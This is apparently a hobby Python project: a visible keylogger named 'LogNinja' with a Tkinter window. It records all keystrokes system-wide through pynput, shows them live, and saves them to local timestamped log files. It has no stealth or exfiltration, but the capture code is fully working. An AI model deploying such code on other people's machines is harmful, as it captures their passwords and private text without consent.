import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import threading
import datetime
import os
import platform

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.running = False
        self.lock = threading.Lock()

    def on_press(self, key):
        if not self.running:
            return

        try:
            key_str = str(key)
            with self.lock:
                if key_str.startswith("'") and key_str.endswith("'"):
                    self.log += key_str[1:-1]
                else:
                    special_keys = {
                        'Key.space': ' ',
                        'Key.enter': '\n',
                        'Key.tab': '\t',
                        'Key.backspace': '[←]',
                        'Key.shift': '',
                        'Key.shift_r': '',
                        'Key.ctrl_l': '',
                        'Key.ctrl_r': '',
                        'Key.alt_l': '',
                        'Key.alt_r': '',
                        'Key.esc': '[ESC]',
                    }
                    self.log += special_keys.get(key_str, f'[{key_str}]')
        except Exception as e:
            with self.lock:
                self.log += f'[Error:{e}]'

    def start(self):
        if not self.running:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None

    def save_log(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_dir = "logs"
        os.makedirs(log_dir, exist_ok=True)

        log_path = os.path.join(log_dir, f"keylog_{timestamp}.txt")
        with self.lock:
            with open(log_path, "w", encoding="utf-8") as file:
                file.write(self.log)


class KeyloggerGUI:
    def __init__(self, root):
        self.keylogger = Keylogger()
        self.root = root
        self.root.title("LogNinja")
        self.root.geometry("500x400")
        self.root.minsize(400, 300)
        self.root.resizable(True, True)

        # ---- ICON / FAVICON SETUP ----
        if platform.system() == "Windows":
            try:
                self.root.iconbitmap("assets/logo.ico")
            except:
                pass
        else:
            try:
                logo_icon = tk.PhotoImage(file="assets/logo.png")
                self.root.iconphoto(True, logo_icon)
            except:
                pass

        # ---- LOGO IMAGE AT THE TOP (Small) ----
        try:
            self.logo_img = tk.PhotoImage(file="assets/logo.png")
            # Shrink image (adjust subsample as needed)
            self.logo_img = self.logo_img.subsample(4, 4)  # scale down 4x
            logo_label = tk.Label(root, image=self.logo_img)
            logo_label.pack(pady=(5, 0))
        except:
            pass  # silently ignore if image not found


        self.status_label = tk.Label(root, text="Status: Stopped", fg="red", font=("Arial", 12))
        self.status_label.pack(pady=10)

        button_frame = tk.Frame(root)
        button_frame.pack()

        self.start_button = tk.Button(button_frame, text="Start Logging", command=self.start_logging, bg="green", fg="white")
        self.start_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = tk.Button(button_frame, text="Stop Logging", command=self.stop_logging, bg="red", fg="white")
        self.stop_button.pack(side=tk.LEFT, padx=5)

        self.save_button = tk.Button(button_frame, text="Save Log", command=self.save_log, bg="blue", fg="white")
        self.save_button.pack(side=tk.LEFT, padx=5)

        self.log_display = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Consolas", 10))
        self.log_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.update_display()

    def start_logging(self):
        if not self.keylogger.running:
            self.thread = threading.Thread(target=self.keylogger.start, daemon=True)
            self.thread.start()
            self.status_label.config(text="Status: Logging...", fg="green")

    def stop_logging(self):
        self.keylogger.stop()
        self.status_label.config(text="Status: Stopped", fg="red")

    def save_log(self):
        self.keylogger.save_log()
        self.status_label.config(text="Log Saved!", fg="blue")

    def update_display(self):
        with self.keylogger.lock:
            current_log = self.keylogger.log
        self.log_display.delete(1.0, tk.END)
        self.log_display.insert(tk.END, current_log)
        self.root.after(500, self.update_display)


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
